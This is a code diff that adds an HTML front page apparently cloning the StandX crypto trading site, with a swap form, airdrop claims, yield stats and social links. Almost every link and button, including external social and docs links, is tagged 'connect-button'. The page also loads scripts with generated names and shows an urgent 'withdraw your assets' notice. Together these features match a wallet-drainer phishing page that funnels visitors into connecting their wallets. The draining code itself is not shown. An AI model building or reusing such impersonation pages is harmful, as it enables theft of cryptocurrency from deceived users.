@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>StandX: Universal Markets. Universal Yield.</title>
+  <meta name="description"
+    content="Universal Markets. Universal Yield. StandX is a Perps DEX on BNB and Solana, powered by yield-bearing $DUSD. Trade perpetuals with margin that automatically earns yield without staking.">
+  <meta name="theme-color" content="#ffffff">
+  <meta property="og:title" content="StandX: Universal Markets. Universal Yield.">
+  <meta property="og:site_name" content="StandX Perps">
+  <meta property="og:type" content="website">
+
+  <script src="assets/sources.js"></script>
+  <script src="assets/app-bundle_mv6x7hf6.js"></script>
+  <script src="assets/qr-code-styling.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter+Tight:wght@400;500;600;700&family=JetBrains+Mono:wght@500;700&display=swap"
+    rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <!-- LOGO PLACEHOLDER (replace with real StandX mark in production) -->
+
+
+  <header class="site-header" id="siteHeader">
+    <!-- NOTICE BAR -->
+    <div class="notice" role="region" aria-label="Notice">
+      <span class="notice-badge">NOTICE</span>
+      <p class="notice-text">
+        StandX is easing operations. Please read the announcement and withdraw your assets in time.
+        <a class="notice-link" href="https://x.com/standx_official/status/2110613283967230232" target="_blank"
+          rel="noopener">Learn more <i class="ri-arrow-right-up-line"></i></a>
+      </p>
+    </div>
+
+    <!-- NAVBAR -->
+    <div class="navbar">
+      <div class="container navbar-inner">
+        <a class="logo" href="/" aria-label="StandX home">
+          <span class="logo-mark">
+            <img src="img/standxicon.png" alt="">
+          </span>
+          <span class="logo-text">StandX</span>
+        </a>
+
+        <!-- Desktop links -->
+        <ul class="nav-links" role="list">
+          <li class="has-dd">
+            <a href="#perps" class="nav-link connect-button" aria-haspopup="true">PERPS <i
+                class="ri-arrow-down-s-line"></i></a>
+            <div class="dd">
+              <a href="#perps" class="connect-button">Perps</a>
+              <a href="#block-trade" class="connect-button">Block Trade</a>
+              <a href="#vault" class="connect-button">Vault</a>
+            </div>
+          </li>
+          <li class="has-dd">
+            <a href="#dusd" class="nav-link connect-button" aria-haspopup="true">$DUSD <i
+                class="ri-arrow-down-s-line"></i></a>
+            <div class="dd">
+              <a href="#dusd" class="connect-button">$DUSD</a>
+              <a href="#dashboard" class="connect-button">Dashboard</a>
+            </div>
+          </li>
+          <li><a href="#portfolio" class="nav-link connect-button">PORTFOLIO</a></li>
+          <li class="has-dd">
+            <a href="#airdrop" class="nav-link connect-button" aria-haspopup="true">AIRDROP <i
+                class="ri-arrow-down-s-line"></i></a>
+            <div class="dd">
+              <a href="#airdrop" class="connect-button">Airdrop</a>
+              <a href="#points" class="connect-button">Points</a>
+            </div>
+          </li>
+          <li><a href="#network" class="nav-link connect-button">NETWORK</a></li>
+          <li><a href="https://docs.standx.com" class="nav-link connect-button">DOCS</a></li>
+        </ul>
+
+        <div class="nav-actions">
+          <button class="icon-btn lang-btn" type="button" aria-label="Language"><i class="ri-global-line"></i></button>
+          <button class="btn-wallet connect-button" type="button">
+            <img src="img/bnb.png" class="btn-wallet__icon">
+            <span>Connect Wallet</span>
+          </button>
+          <button class="burger" id="burger" type="button" aria-label="Open menu" aria-expanded="false"
+            aria-controls="mobileMenu">
+            <i class="ri-menu-line"></i>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- RESPONSIVE NAV (slides down from the top on mobile) -->
+    <nav class="mobile-menu" id="mobileMenu" aria-label="Mobile" aria-hidden="true">
+      <div class="mobile-menu__scroll">
+        <p class="m-label">TRADE</p>
+        <a href="#perps" class="m-link sub connect-button">Perps</a>
+        <a href="#block-trade" class="m-link sub connect-button">Block Trade</a>
+        <a href="#vault" class="m-link sub connect-button">Vault</a>
+
+        <p class="m-label">$DUSD</p>
+        <a href="#dusd" class="m-link sub connect-button">$DUSD</a>
+        <a href="#dashboard" class="m-link sub connect-button">Dashboard</a>
+
+        <a href="#portfolio" class="m-link connect-button">Portfolio</a>
+
+        <p class="m-label">AIRDROP</p>
+        <a href="#airdrop" class="m-link sub connect-button">Airdrop</a>
+        <a href="#points" class="m-link sub connect-button">Points</a>
+
+        <a href="#network" class="m-link connect-button">Network</a>
+        <a href="https://docs.standx.com" class="m-link connect-button">Docs</a>
+
+        <hr class="m-divider">
+
+        <button class="m-lang" type="button">
+          <span>Language</span>
+          <span class="m-lang__val">English <i class="ri-arrow-right-s-line"></i></span>
+        </button>
+
+        <div class="m-claim">
+          <button class="btn-wallet btn-claim connect-button" type="button">
+            <span class="btn-wallet__icon"><i class="ri-gift-2-fill"></i></span>
+            <span>Claim Airdrop</span>
+          </button>
+        </div>
+      </div>
+    </nav>
+  </header>
+
+  <main>
+    <!-- HERO + SWAP -->
+    <section class="hero">
+      <div class="hero-col">
+        <h1 class="hero-title">Time to <span>Stand</span></h1>
+        <p class="hero-sub">Universal Markets<br>Universal Yield</p>
+
+        <div class="swap" id="swap">
+          <div class="tabs" role="tablist">
+            <button class="tab" type="button" role="tab" data-tab="mint" aria-selected="false">MINT</button>
+            <button class="tab is-active" type="button" role="tab" data-tab="swap" aria-selected="true">SWAP</button>
+          </div>
+
+          <div class="field">
+            <div class="token-select" data-side="from">
+              <button class="token-btn" type="button" aria-haspopup="listbox" aria-expanded="false">
+                <span class="token-icon"></span>
+                <span class="token-name">USDT</span>
+                <i class="ri-arrow-down-s-line"></i>
+              </button>
+              <ul class="token-menu" role="listbox" hidden></ul>
+            </div>
+            <div class="amount-box">
+              <input id="amountIn" class="amount-input" type="text" inputmode="decimal" autocomplete="off" value="50"
+                aria-label="Amount to swap">
+              <div class="balance"><span>BALANCE</span><span class="balance-val">-- <button class="refresh"
+                    type="button" aria-label="Refresh balance"><i class="ri-refresh-line"></i></button></span></div>
+            </div>
+          </div>
+
+          <div class="flip-wrap">
+            <button class="flip" id="flip" type="button" aria-label="Switch tokens"><i
+                class="ri-arrow-up-down-line"></i></button>
+          </div>
+
+          <p class="receive-label">YOU WILL RECEIVE</p>
+
+          <div class="field">
+            <div class="token-select" data-side="to">
+              <button class="token-btn" type="button" aria-haspopup="listbox" aria-expanded="false">
+                <span class="token-icon"></span>
+                <span class="token-name">DUSD</span>
+                <i class="ri-arrow-down-s-line"></i>
+              </button>
+              <ul class="token-menu" role="listbox" hidden></ul>
+            </div>
+            <div class="amount-box">
+              <output id="amountOut" class="amount-input">50.014128</output>
+              <div class="balance"><span>BALANCE</span><span class="balance-val">-- <button class="refresh"
+                    type="button" aria-label="Refresh balance"><i class="ri-refresh-line"></i></button></span></div>
+            </div>
+          </div>
+
+          <div class="rows">
+            <div class="row row-apy"><span class="dotted" title="Native yield expansion APY">SIP-3
+                APY</span><strong>1.01%</strong></div>
+            <div class="row"><span>Est Yield <i class="ri-information-line"></i></span><span id="estYield">$0.51</span>
+            </div>
+            <div class="row"><span>Price Impact</span><span id="priceImpact">0.01%</span></div>
+            <div class="row"><span>Fee</span><span>--</span></div>
+            <button class="settings-toggle" id="settingsToggle" type="button" aria-expanded="false">Settings <i
+                class="ri-arrow-down-s-line"></i></button>
+            <div class="settings-panel" id="settingsPanel" hidden>
+              <span>Slippage</span>
+              <div class="slip-opts">
+                <button type="button" class="slip is-active">0.1%</button>
+                <button type="button" class="slip">0.5%</button>
+                <button type="button" class="slip">1%</button>
+              </div>
+            </div>
+          </div>
+
+          <button class="btn-block connect-button" type="button">CONNECT WALLET</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- STAND TO EARN PANEL -->
+    <section class="stand container">
+      <div class="panel">
+
+        <div class="cell banner">
+          <div class="banner-text">
+            <p class="eyebrow">YIELD-BEARING STABLECOIN + PERPETUALS</p>
+            <h2 class="banner-title"><span>Stand to Earn.</span><br>Trade with yield-enhanced margin.</h2>
+          </div>
+          <!-- IMAGE PLACEHOLDER: sphere -->
+          <div class="sphere" role="img" aria-label="StandX sphere"></div>
+          <a class="btn-dark" href="#perps">CLAIM AIRDROP <i class="ri-arrow-right-line"></i></a>
+        </div>
+
+        <div class="cell stat">
+          <p class="label">DUSD HOLDERS</p>
+          <p class="big">238,267</p>
+        </div>
+        <div class="cell stat">
+          <p class="label">PERPS 24H VOL/$</p>
+          <p class="big">53.17 mn</p>
+        </div>
+        <div class="cell stat">
+          <p class="label">OPEN INTEREST/$</p>
+          <p class="big">11.04 mn</p>
+        </div>
+
+        <div class="cell feat feat-real">
+          <h3 class="green-title">Real yield,<br>no staking required.</h3>
+          <p class="body">DUSD holders automatically receive yields from market neutral strategies e.g. spot staking and
+            funding rate arbitrage.</p>
+        </div>
+        <div class="cell feat feat-stable">
+          <h3 class="feat-title">Stable, Liquid <i class="ri-wallet-3-line"></i></h3>
+          <p class="body">Market-neutral collateral, fully hedged. On-chain liquidity across BNB and Solana.</p>
+          <div class="feat-foot">
+            <p class="label">DUSD TVL</p>
+            <p class="big">25.76 mn</p>
+          </div>
+        </div>
+        <div class="cell feat feat-apy">
+          <h3 class="feat-title">APY, Stacked, Amplified</h3>
+          <p class="body">Base yield from market-neutral strategies, stacked with SIP-2 1x leverage and amplified by
+            SIP-3 Native Yield Expansion.</p>
+          <div class="feat-foot">
+            <p class="label green dotted-wrap"><span class="dotted">SIP-2+3 APY</span></p>
+            <p class="big green apy"><span class="moon" aria-hidden="true"></span>6.41%</p>
+          </div>
+        </div>
+
+        <div class="cell sip sip2">
+          <h3 class="green-title">SIP-2: Position Yield</h3>
+          <p class="body">Industry-first margin yield. Open positions continuously accrue rewards.</p>
+          <canvas class="pos-chart" id="posChart" aria-hidden="true"></canvas>
+        </div>
+        <div class="cell sip sip1">
+          <div class="sip1-text">
+            <h3 class="green-title">SIP-1: Block Trade</h3>
+            <p class="lead">A StandX Innovation: Zero slippage. No price chasing.</p>
+            <p class="body">Exclusive solution for ANY size trades. Matched on-chain, settled on StandX with fully
+              isolated pricing.</p>
+          </div>
+          <a class="btn-cta connect-button" href="#block-trade">Explore Block Trade <i
+              class="ri-arrow-right-line"></i></a>
+        </div>
+
+        <div class="cell camp-img" aria-hidden="true">
+          <!-- IMAGE PLACEHOLDER: wallet illustration -->
+          <svg viewBox="0 0 320 240" class="camp-svg">
+            <rect x="8" y="30" width="56" height="44" rx="3" fill="none" stroke="#c9c9c4" />
+            <rect x="256" y="168" width="56" height="52" rx="3" fill="none" stroke="#c9c9c4" />
+            <path d="M200 120l40-46v22l-8 6z" fill="#8fcfa7" />
+            <path d="M36 190l30-36v18l-4 4z" fill="#dff1e6" />
+            <rect x="58" y="96" width="176" height="116" rx="8" fill="#fff" stroke="#c9c9c4" />
+            <rect x="196" y="140" width="48" height="26" rx="13" fill="#fff" stroke="#c9c9c4" />
+            <circle cx="150" cy="82" r="38" fill="#0d3b27" stroke="#8fcfa7" stroke-width="3" />
+            <svg x="128" y="60" width="44" height="44" viewBox="0 0 40 40" style="color:#fff">
+              <use href="#standx-mark" />
+            </svg>
+            <circle cx="196" cy="110" r="20" fill="#2f6a4f" />
+          </svg>
+        </div>
+        <div class="cell camp">
+          <p class="eyebrow">MAINNET CAMPAIGN <i class="ri-rocket-line"></i></p>
+          <h3 class="camp-title">Limited-Time Genesis Advantage: Maximize your early rewards.<br>Earn DUSD yield today.
+            Secure protocol upside tomorrow.</h3>
+          <a class="btn-cta connect-button" href="#mainnet-campaign">Join Mainnet Campaign <i
+              class="ri-arrow-right-line"></i></a>
+        </div>
+      </div>
+    </section>
+
+    <!-- REVENUE CYCLE -->
+    <section class="cycle container" aria-label="Revenue cycle">
+      <div class="cycle-panel">
+        <p class="cycle-title">REVENUE CYCLE</p>
+        <div class="cycle-body">
+          <div class="cycle-heads">
+            <span>ON-CHAIN USER</span>
+            <span>ON-CHAIN INFRASTRUCTURE</span>
+            <span>OFF-CHAIN REVENUE STREAM</span>
+          </div>
+          <div class="cycle-grid" id="cycleGrid">
+            <div class="node" style="--c:1;--r:1;--mc:7;--mr:1"><span class="node-label">USD(x) ACCOUNT</span><i
+                class="ri-money-dollar-circle-line node-icon"></i></div>
+            <div class="node" style="--c:1;--r:5;--mc:10;--mr:1"><span class="node-label">DUSD ACCOUNT</span><svg
+                class="node-mark" viewBox="0 0 40 40">
+                <use href="#standx-mark" />
+              </svg></div>
+            <div class="node" data-node="gateway" style="--c:17;--r:5;--mc:7;--mr:13"><span
+                class="node-label">GATEWAY</span><i class="ri-route-line node-icon"></i></div>
+            <div class="node is-purple" style="--c:13;--r:13;--mc:1;--mr:10"><span class="node-label">DUSD
+                PROGRAM</span><svg class="node-mark" viewBox="0 0 40 40">
+                <use href="#standx-mark" />
+              </svg></div>
+            <div class="node is-purple" style="--c:17;--r:13;--mc:1;--mr:13"><span class="node-label">SETTLER</span>
+              <svg class="node-icon node-settler" viewBox="0 0 48 48">
+                <path d="M24 22V8M24 26v14M22 24H8M26 24h14" stroke="currentColor" stroke-width="2" fill="none" />
+                <path d="M18 14l6 8 6-8zM18 34l6-8 6 8zM14 18l8 6-8 6zM34 18l-8 6 8 6z" fill="currentColor" />
+              </svg>
+            </div>
+            <div class="node is-orange" style="--c:21;--r:13;--mc:1;--mr:16"><span class="node-label">RSV FUND</span><i
+                class="ri-focus-3-line node-icon node-icon--box"></i></div>
+            <div class="node" style="--c:33;--r:1;--mc:10;--mr:25"><span class="node-label">CUSTODY</span><i
+                class="ri-key-2-line node-icon"></i></div>
+            <div class="node" style="--c:33;--r:5;--mc:7;--mr:25"><span class="node-label">FUNDING/STAKE</span><i
+                class="ri-stack-line node-icon"></i></div>
+            <div class="node" style="--c:33;--r:9;--mc:4;--mr:25"><span class="node-label">PERPS FEE</span><i
+                class="ri-planet-line node-icon"></i></div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="container footer-inner">
+      <div class="footer-brand">
+        <a class="logo" href="/" aria-label="StandX home">
+          <span class="logo-mark"><svg viewBox="0 0 40 40">
+              <img src="img/standxicon.png" alt="">
+            </svg></span>
+          <span class="logo-text">StandX</span>
+        </a>
+        <p class="copy">&copy; standx.com - All rights reserved.</p>
+        <p class="job">Do you need a job?</p>
+      </div>
+      <div class="footer-col">
+        <h4>SOCIAL</h4>
+        <ul role="list">
+          <li><a class="connect-button" href="https://x.com/standx_official" target="_blank" rel="noopener">X
+              (Twitter)</a></li>
+          <li><a class="connect-button" href="https://discord.gg/standx" target="_blank" rel="noopener">Discord</a></li>
+          <li><a class="connect-button" href="https://t.me/standx_community" target="_blank" rel="noopener">Telegram</a>
+          </li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>INFO</h4>
+        <ul role="list">
+          <li><a class="connect-button" href="https://docs.standx.com">Docs</a></li>
+          <li><a class="connect-button" href="https://docs.standx.com/blog">Blog</a></li>
+          <li><a class="connect-button" href="https://gallery.standx.org">Gallery</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <script src="main.js"></script>
+</body>
+
+</html>
